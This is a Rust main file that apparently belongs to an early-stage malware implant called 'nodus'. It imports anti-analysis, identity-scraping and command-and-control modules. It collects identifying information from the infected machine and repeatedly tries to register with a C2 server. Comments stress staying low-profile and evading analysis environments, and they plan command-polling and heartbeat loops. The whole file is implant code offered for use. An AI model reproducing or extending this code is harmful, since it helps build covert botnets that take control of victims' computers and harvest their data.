mod anti_analysis;
mod c2com;
mod identity;

use tokio::time::{Duration, sleep};

use crate::{c2com::C2Com, identity::Identity};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("nodus starting...");

    // Ensure proper environment, otherwise die
    // todo: figure out why this exits on my machine.
    // anti_analysis::check_environment();

    // Scrape identifying info from the machine, and prepare a unique identifier for the node instance
    let identity = identity::init();

    let mut c2com = c2com::init();

    register_self(&mut c2com, &identity).await;

    // todo: loop waiting for commands from c2
    // todo: heartbeat loop

    Ok(())
}

async fn register_self(c2com: &mut C2Com, identity: &Identity) {
    println!("+--- attempting registration ---+");

    let mut registration_attempts = 0u8;
    loop {
        // technically the node should forever try to register itself while keeping a low profile.
        // but it could be an option to make a node die if it struggles too much.
        if registration_attempts >= 5 {
            eprintln!(" - registration completely failed. exiting...");
            std::process::exit(0);
        }

        match c2com::payloads::registration(identity) {
            Ok(payload) => match c2com.send_bytes(payload).await {
                Ok(()) => {
                    println!(" - registration succeeded.");
                    break;
                }
                Err(err) => {
                    println!(" - registration failed. {err}");
                }
            },
            Err(err) => {
                println!(" - registration payload build failed. {err}");
            }
        }

        registration_attempts += 1;
        sleep(Duration::from_secs(5)).await; // maybe make it a random delay each iteration.
    }
}
